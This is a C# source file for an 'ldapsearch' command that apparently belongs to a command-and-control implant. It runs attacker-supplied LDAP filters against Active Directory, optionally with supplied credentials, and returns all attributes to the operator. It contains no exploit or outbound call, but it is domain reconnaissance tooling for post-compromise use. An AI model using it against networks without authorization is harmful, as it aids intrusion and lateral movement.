using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.DirectoryServices;
using System.Security.Principal;
using Engineer.Functions;

namespace Engineer.Commands
{
    internal class LdapSearch : EngineerCommand
    {
        public override string Name => "ldapsearch";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //let the user supply the ldap search filter with /search argument
                var searchFilter = task.Arguments.TryGetValue("/search", out string searchFilterName) ? searchFilterName : null;
                //if searchFilter is null return telling the user to supply an ldap search flter
                if (searchFilter == null)
                {
                    Tasking.FillTaskResults("Please supply an ldap search filter with /search argument",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                //check for arguments for /domain /username and /password
                string targetDomain = task.Arguments.TryGetValue("/domain", out string domainName) ? domainName : null;
                string username = task.Arguments.TryGetValue("/username", out string usernameName) ? usernameName : null;
                string pass = task.Arguments.TryGetValue("/password", out string password) ? password : null;

                // if domain is null geet the current domain
                if (targetDomain == null)
                {
                    targetDomain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
                }
                //create a directory entry for the target domain, if username and password are not null then use those as well
                DirectoryEntry domain;
                if (username != null && pass != null)
                {
                    domain = new DirectoryEntry("LDAP://" + targetDomain, username, pass);
                }
                else
                {
                    domain = new DirectoryEntry("LDAP://" + targetDomain);
                }
                //create a directory searcher for the domain
                var searcher = new DirectorySearcher(domain);
                //set the search filter to the searchFilter argument
                searcher.Filter = searchFilter;
                // add the search extension of !1.2.840.113556.1.4.801=::MAMCAQc= to help resolve ntsecuritydescriptor


                //search the domain
                var results = searcher.FindAll();
                //create a string builder to hold the results
                StringBuilder sb = new StringBuilder();
                //loop through the results and add them to the string builder
                foreach (SearchResult result in results)
                {
                    //get each property name and value that came back and add it to the string builder
                    foreach (string propertyName in result.Properties.PropertyNames)
                    {
                        foreach (object propertyValue in result.Properties[propertyName])
                        {
                            //if propertyValue is a byte array then convert it to a string
                            //if (propertyValue is byte[])
                            //{
                            //    byte[] sid = (byte[])propertyValue;
                            //    string sidStr = new SecurityIdentifier(sid, 0).ToString();
                            //    sb.AppendLine(propertyName + ": " + sidStr);
                            //}
                            //else
                            //{
                            //    sb.AppendLine(propertyName + ": " + propertyValue);
                            //}
                            sb.AppendLine(propertyName + ": " + propertyValue);
                        }
                    }

                }
                //return the string builder
                Tasking.FillTaskResults(sb.ToString(),task,EngTaskStatus.Complete,TaskResponseType.String);

            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
               // Console.WriteLine(ex.StackTrace);
                Tasking.FillTaskResults(ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
           
        }
    }
}
